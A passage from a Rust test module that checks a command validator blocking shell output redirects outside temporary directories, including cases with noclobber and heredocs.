        // /tmpfoo is not a temp dir
        assert!(validate_command("echo x > /private/tmpfoo/out.txt").is_some());
    }

    #[test]
    #[cfg(unix)]
    fn issue_1142_noclobber_to_scratch_allowed() {
        assert!(validate_command("cargo test >|/tmp/out.log").is_none());
        assert!(validate_command("echo x >|out.txt").is_some());
    }

    #[test]
    fn real_redirect_after_heredoc_still_blocked() {
        let cmd = "cat <<EOF > output.txt\ndata\nEOF";
        assert!(
            validate_command(cmd).is_some(),
            "redirect OUTSIDE heredoc body must still block"
        );
    }
}
